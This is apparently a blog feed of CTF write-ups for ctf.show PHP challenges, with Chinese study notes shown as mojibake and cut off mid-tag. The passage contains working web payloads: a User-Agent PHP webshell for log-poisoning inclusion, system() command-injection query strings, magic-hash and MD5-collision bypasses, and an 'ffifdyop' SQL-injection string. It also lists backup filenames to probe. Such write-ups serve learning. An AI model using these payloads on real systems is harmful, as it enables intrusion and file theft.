<h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è§£æ³•ä¸€ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://a10018ad-9503-4957-9de2-24a693837991.challenge.ctf.show/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶ua å¤´å†™å…¥ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line">1=system(&quot;tac f*&quot;);  //postä¼ å…¥</span><br></pre></td></tr></table></figure>

<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŠŠå†’å·è¿‡æ»¤äº†ä¼ªåè®®ç”¨ä¸äº†</p>
<p>è§£æ³•ä¸€ï¼šæ—¥å¿—åŒ…å«å’Œä¸Šé¢˜ä¸€æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://167c670e-4138-48aa-9480-9f484963d114.challenge.ctf.show/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php echo`tac f*`;?&gt;  //uaä¼ å…¥</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>phpå®¡è®¡å­¦ä¹ </title>
    <url>/2023/01/09/php%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p> æ”¶é›†ä¿¡æ¯</p>
<p>phpå‡½æ•°</p>
<p>æ­£åˆ™åŒ¹é…å…¬å¼è¯­æ³•</p>
<p>ç»•è¿‡</p>
  <span id="more"></span>

<p>è‡ªåŠ¨å¤‡ä»½å½“å‰æ–‡ä»¶</p>
<p>index.php.swp</p>
<p>index.php.swo</p>
<p>index.php.bak</p>
<p>index.php.txt</p>
<p>index.php.old</p>
<p>index.php~</p>
<p>æ•´ç«™æºç å¤‡ä»½æ–‡ä»¶</p>
<p>www wwwdata  wwwroot  web  webrooot</p>
<p>backup dist</p>
<p>&#x2F;&#x2F;åé¢å†åŠ ä¸Š.zip .tar.7z.rar</p>
<p>.tar.gz</p>
<p>æˆ–è€…å¾¡å‰‘dirserachæ‰«ä¸€ä¸‹</p>
<h2 id="phpå‡½æ•°"><a href="#phpå‡½æ•°" class="headerlink" title="phpå‡½æ•°"></a>phpå‡½æ•°</h2><p><a href="https://www.php.net/">https://www.php.net/</a></p>
<p><strong>åœ¨PHPä¸­ï¼Œ0&#x3D;&#x3D;&#x3D;FALSEæ˜¯é”™è¯¯çš„</strong></p>
<h2 id="åŒ¹é…å…¬å¼è¯­æ³•"><a href="#åŒ¹é…å…¬å¼è¯­æ³•" class="headerlink" title="åŒ¹é…å…¬å¼è¯­æ³•"></a>åŒ¹é…å…¬å¼è¯­æ³•</h2><table>
<thead>
<tr>
<th align="center">é‡è¯</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+</td>
<td>åŒ¹é…ä»»ä½•è‡³å°‘åŒ…å«ä¸€ä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">*</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«é›¶ä¸ªæˆ–å¤šä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">?</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«é›¶ä¸ªæˆ–1ä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">.</td>
<td>åŒ¹é…ä»»æ„ä¸€ä¸ªå­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">{x}</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«xä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">{x,y}</td>
<td>åŒ¹é…ä»»ä½•åŒ…å« x åˆ° y ä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">{x,}</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«è‡³å°‘xä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">^</td>
<td>åŒ¹é…å­—ç¬¦ä¸²çš„è¡Œé¦–</td>
</tr>
<tr>
<td align="center">$</td>
<td>åŒ¹é…å­—ç¬¦ä¸²çš„è¡Œå°¾</td>
</tr>
<tr>
<td align="center">|</td>
<td>é€‰æ‹©ç¬¦ åŒ¹é…å­—ç¬¦ä¸²çš„å·¦è¾¹æˆ–è€…å³è¾¹</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">å…ƒå­—ç¬¦</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="center">[a-z]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«å°å†™å­—æ¯a-zçš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[A-Z]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«å¤§å†™å­—æ¯A-Zçš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[0-9]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«0-9çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[abc]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«å°å†™å­—æ¯a,b,cçš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[^abc]</td>
<td>åŒ¹é…ä»»ä½•ä¸åŒ…å«å°å†™å­—æ¯a,b,cçš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[a-zA-Z0-9_]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«a-zA-Z0-9å’Œä¸‹åˆ’çº¿çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">\w</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«a-zA-Z0-9å’Œä¸‹åˆ’çº¿çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">\W</td>
<td>åŒ¹é…ä»»ä½•ä¸åŒ…å«a-zA-Z0-9å’Œä¸‹åˆ’çº¿çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">\d</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«æ•°å­—å­—ç¬¦</td>
</tr>
<tr>
<td align="center">\D</td>
<td>åŒ¹é…ä»»ä½•éæ•°å­—å­—ç¬¦</td>
</tr>
<tr>
<td align="center">\s</td>
<td>åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦</td>
</tr>
<tr>
<td align="center">\S</td>
<td>åŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦</td>
</tr>
<tr>
<td align="center">\b</td>
<td>åŒ¹é…æ˜¯å¦åˆ°è¾¾äº†å•è¯è¾¹ç•Œ</td>
</tr>
<tr>
<td align="center">\B</td>
<td>åŒ¹é…æ²¡æœ‰åˆ°è¾¾äº†å•è¯è¾¹ç•Œ</td>
</tr>
<tr>
<td align="center">\</td>
<td>åŒ¹é…æ­£åˆ™ä¸­çš„ç‰¹æ®Šå­—ç¬¦</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">ä¿®é¥°ç¬¦</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="center">i</td>
<td>å®Œå…¨ä¸åŒºåˆ†å¤§å°å†™</td>
</tr>
<tr>
<td align="center">m</td>
<td>å¯ä»¥é‡‡ç”¨å¤šè¡Œè¯†åˆ«,é‡åˆ°æ¢è¡Œä¹Ÿæ‰¿è®¤åŒ¹é…è§„åˆ™</td>
</tr>
<tr>
<td align="center">x</td>
<td>å¿½ç•¥æ‰è§„åˆ™æ¨¡å¼ä¸­çš„ç©ºç™½å­—ç¬¦</td>
</tr>
<tr>
<td align="center">A</td>
<td>å¼ºåˆ¶ä»å¤´å¼€å§‹åŒ¹é…</td>
</tr>
<tr>
<td align="center">U</td>
<td>ç¦æ­¢è´ªå©ªåŒ¹é…ï¼Œåªè·Ÿè¸ªåˆ°æœ€è¿‘çš„ä¸€ä¸ªåŒ¹é…ç¬¦å¹¶ç»“æŸ</td>
</tr>
</tbody></table>
<p><a href="http://sai2.game178.cn/index.php/index/index/view/id/8">http://sai2.game178.cn/index.php/index/index/view/id/8</a></p>
<h2 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h2><p>ç›´åˆ°é‡ä¸Šæ•°å­—æˆ–æ­£è´Ÿç¬¦å·æ‰å¼€å§‹åšè½¬æ¢ï¼Œå†é‡åˆ°éæ•°å­—æˆ–<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">å­—ç¬¦ä¸²</a>ç»“æŸæ—¶ï¼Œç»“æŸè½¬æ¢</p>
<p>intval($id)ä¼šä»å­—ç¬¦ä¸²$idçš„èµ·å§‹ä½ç½®å¼€å§‹å»æ•°å­—ç¢°åˆ°éæ•°å­—å°±ç»“æŸ,å½“èµ·å§‹ä½ç½®ä¸ºéæ•°å­—æ—¶åˆ™ä¸º0ã€‚<br>æ¯”å¦‚<br>intval(â€˜100a123â€™)&#x3D;100<br>intval(â€˜a123â€™)&#x3D;0</p>
<p><code>?id=&#39;1000&#39; //&quot;1000&quot;æˆ–(1000)çš†å¯ ?id=125&lt;&lt;3 //å·¦ç§» ?id=680|320 //æŒ‰ä½æˆ– ?id=992^8 //æŒ‰ä½å¼‚æˆ– ?id=~~1000 //ä¸¤æ¬¡å–å ?id=0x3e8 //åå…­è¿›åˆ¶ ?id=0b1111101000 //äºŒè¿›åˆ¶</code></p>
<p><code>?id=(1000)</code>ä»¥åŠ+-*&#x2F;è¿ç®—</p>
<h2 id="x3D-x3D-ç»•è¿‡"><a href="#x3D-x3D-ç»•è¿‡" class="headerlink" title="&#x3D;&#x3D;ç»•è¿‡"></a>&#x3D;&#x3D;ç»•è¿‡</h2><p>PHPæ¯”è¾ƒè¿ç®—ç¬¦ &#x3D;&#x3D;åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™æ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œåªéœ€è¦æ¯”è¾ƒä¸¤ä¸ªå€¼ç›¸ç­‰å°±è¡Œï¼Œä¸ä¼šæ¯”è¾ƒç±»å‹</p>
<p>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!&#x3D;â€æˆ–â€&#x3D;&#x3D;â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;&#x3D;ç»•è¿‡<br>PHPæ¯”è¾ƒè¿ç®—ç¬¦ &#x3D;&#x3D;&#x3D;åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆåˆ¤æ–­ä¸¤ç§å­—ç¬¦ä¸²çš„ç±»å‹æ˜¯å¦ç›¸ç­‰ï¼Œå†æ¯”è¾ƒå€¼æ˜¯å¦ç›¸ç­‰ã€‚åªè¦ä¸¤è¾¹å­—ç¬¦ä¸²ç±»å‹ä¸åŒä¼šè¿”å›false</p>
<p>ç»•è¿‡æ–¹æ³•ï¼šä½¿ç”¨æ•°ç»„ç»•è¿‡</p>
<p>if($_GET[â€˜nameâ€™] !&#x3D; $_GET[â€˜passwordâ€™]){</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) == <span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;?&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>}</p>
<p>&#x2F;&#x2F;name[]&#x3D;1&amp;password[]&#x3D;2</p>
<p>PHPä¸­md5()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼ˆä¼šè¿”å›NULLï¼‰</p>
<p>md5å€¼ç›¸ç­‰bpæŠ“åŒ…ä¼ å‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;çš„ä¹Ÿå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡</p>
<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h2><p>16è¿›åˆ¶ç»•è¿‡</p>
<p>ç©ºå­—ç¬¦%00 æˆ–è€…%20</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>æ•°å€¼%20</p>
</li>
<li><p>%00æ•°å€¼</p>
</li>
<li><p>æ•°å€¼%00</p>
</li>
</ol>
<h2 id="ffifdyop"><a href="#ffifdyop" class="headerlink" title="ffifdyop"></a>ffifdyop</h2><p>ç»è¿‡md5åŠ å¯†åï¼š276f722736c95d99e921722cf9ed621c</p>
<p>å†è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼šâ€™orâ€™6&lt;ä¹±ç &gt; å³  <code>&#39;or&#39;66 ]  !r,  b</code></p>
<p>ç”¨é€”ï¼š</p>
<p>select * from admin where password&#x3D;â€™â€™orâ€™6&lt;ä¹±ç &gt;â€™</p>
<p>å°±ç›¸å½“äºselect * from admin where password&#x3D;â€™â€™or 1 å®ç°sqlæ³¨å…¥</p>
<h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg"></a>ereg</h2><p>**ereg()**å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²,å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›falseã€‚æœç´¢å­—æ¯çš„å­—ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚</p>
<p>â‘ %00æˆªæ–­åŠé‡åˆ°%00åˆ™é»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„ç»“æŸ</p>
<p>  â‘¡å½“ntfä¸ºæ•°ç»„æ—¶å®ƒçš„è¿”å›å€¼ä¸æ˜¯FALSE</p>
<p>web108</p>
<p>payload :  c&#x3D;a%00778  </p>
<h2 id="å¼‚å¸¸å¤„ç†ç±»"><a href="#å¼‚å¸¸å¤„ç†ç±»" class="headerlink" title="å¼‚å¸¸å¤„ç†ç±»"></a>å¼‚å¸¸å¤„ç†ç±»</h2><p>web109</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;</span><br><span class="line">            eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä½“æ¥è¯´ï¼Œè¯¥è¯­å¥ä½¿ç”¨äº† PHP ä¸­çš„ â€œå˜é‡å‡½æ•°â€ è¯­æ³•ï¼Œå…¶ä¸­ $v1 æ˜¯ä¸€ä¸ªå˜é‡ï¼ŒåŒ…å«ä¸€ä¸ªç±»åï¼Œ$v2 æ˜¯ä¸€ä¸ªå˜é‡ï¼ŒåŒ…å«å‚æ•°å€¼ã€‚è¯¥è¯­å¥çš„æ‰§è¡Œå°†åˆ›å»ºä¸€ä¸ªæ–°çš„ $v1 ç±»çš„å®ä¾‹ï¼Œå¹¶å°† $v2 çš„å€¼ä½œä¸ºå‚æ•°ä¼ é€’ç»™ $v1 ç±»çš„æ„é€ å‡½æ•°ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå‡è®¾ $v1 åŒ…å«ç±»å MyClassï¼Œ$v2 åŒ…å«å‚æ•°å€¼ â€œhelloâ€ï¼Œåˆ™æ‰§è¡Œè¯¥è¯­å¥å°†åˆ›å»ºä¸€ä¸ªæ–°çš„ MyClass å¯¹è±¡å®ä¾‹ï¼Œå¹¶è°ƒç”¨ MyClass çš„æ„é€ å‡½æ•°ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpCopy code</span><br><span class="line">$obj = new MyClass(&quot;hello&quot;);</span><br></pre></td></tr></table></figure>

<p>è¯·æ³¨æ„ï¼Œå¦‚æœ $v1 ä¸­åŒ…å«çš„ç±»åä¸å­˜åœ¨æˆ–æ— æ³•è®¿é—®ï¼Œåˆ™ä¼šå¼•å‘ä¸€ä¸ªè‡´å‘½é”™è¯¯ã€‚åŒæ ·ï¼Œå¦‚æœ $v1 ç±»æ²¡æœ‰å®šä¹‰æ„é€ å‡½æ•°æˆ–æ„é€ å‡½æ•°éœ€è¦ä¸åŒæ•°é‡æˆ–ç±»å‹çš„å‚æ•°ï¼Œåˆ™ä¹Ÿä¼šå¼•å‘ä¸€ä¸ªé”™è¯¯ã€‚</p>
<p>Exceptionæ˜¯ä¸€ä¸ªå†…ç½®ç±»ï¼Œç”¨äºè¡¨ç¤ºç¨‹åºè¿è¡Œæ—¶å‡ºç°çš„å¼‚å¸¸æƒ…å†µã€‚å¯ä»¥é€šè¿‡æŠ›å‡ºï¼ˆthrowï¼‰å¼‚å¸¸æ¥æŒ‡ç¤ºç¨‹åºä¸­çš„é”™è¯¯æˆ–é—®é¢˜ï¼Œç„¶åé€šè¿‡æ•è·ï¼ˆcatchï¼‰å¼‚å¸¸æ¥å¤„ç†å®ƒä»¬ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=Exception();system(&quot;ls&quot;);&amp;v2=a</span><br><span class="line">?v1=Exception();system(&quot;tac%09fl36dg.txt&quot;);&amp;v2=a</span><br><span class="line">?v1=ReflectionClass&amp;v2=system(&quot;ls&quot;)</span><br><span class="line">?v1=ReflectionClass(&quot;PDO&quot;);system(&quot;ls&quot;);&amp;v2=a</span><br></pre></td></tr></table></figure>

<p>ä»è€Œå®ç°å‘½ä»¤æ‰§è¡Œ</p>
<h2 id="FilesystemIteratorç±»è¯»å–-æ–‡ä»¶"><a href="#FilesystemIteratorç±»è¯»å–-æ–‡ä»¶" class="headerlink" title="FilesystemIteratorç±»è¯»å– æ–‡ä»¶"></a>FilesystemIteratorç±»è¯»å– æ–‡ä»¶</h2><p>web110</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd</p>
<p>é€šè¿‡æ–°å»ºFilesystemIteratorï¼Œå¯ä»¥æ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ç»“æ„ã€‚ç”±äºå‚æ•°å†…éƒ¨æœ‰ä¸ªæ‹¬å·ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨å­—ç¬¦ä¸²æ¥ç´¢å¼•è·¯å¾„ï¼Œè€Œæ˜¯è¦é€šè¿‡æ‹¼æ¥æ–¹æ³•getcwd()æ¥è·å–å½“å‰çš„è·¯å¾„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">getcwd</span>().PHP_EOL;</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&#x27;./&#x27;</span>).PHP_EOL;</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="title function_ invoke__">getcwd</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;D:\PHP</span><br><span class="line">  index.php</span><br><span class="line">  index.php</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/Xxy605/article/details/110128544">(11æ¡æ¶ˆæ¯) CTFæŠ€å·§_Webâ€”â€”PHPç‰¹æ€§_ä½¿ç”¨æ–‡ä»¶ç³»ç»Ÿè¿­ä»£å™¨FilesystemIteratorå’Œgetcwd()æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ç»“æ„_Ho1aAsçš„åšå®¢-CSDNåšå®¢</a></p>
<h2 id="GLOBALSå…¨å±€å˜é‡"><a href="#GLOBALSå…¨å±€å˜é‡" class="headerlink" title="$GLOBALSå…¨å±€å˜é‡"></a>$GLOBALSå…¨å±€å˜é‡</h2><p>ä» PHP 8.1.0 èµ·ï¼Œä¸å†æ”¯æŒå¯¹æ•´ä¸ª $GLOBALS æ•°ç»„çš„å†™è®¿é—®ï¼š</p>
<p>$GLOBALS -å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡</p>
<p>ä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getFlag(&amp;$v1,&amp;$v2)&#123;</span><br><span class="line">    eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.php.net/manual/zh/reserved.variables.globals.php">PHP: $GLOBALS - Manual</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ 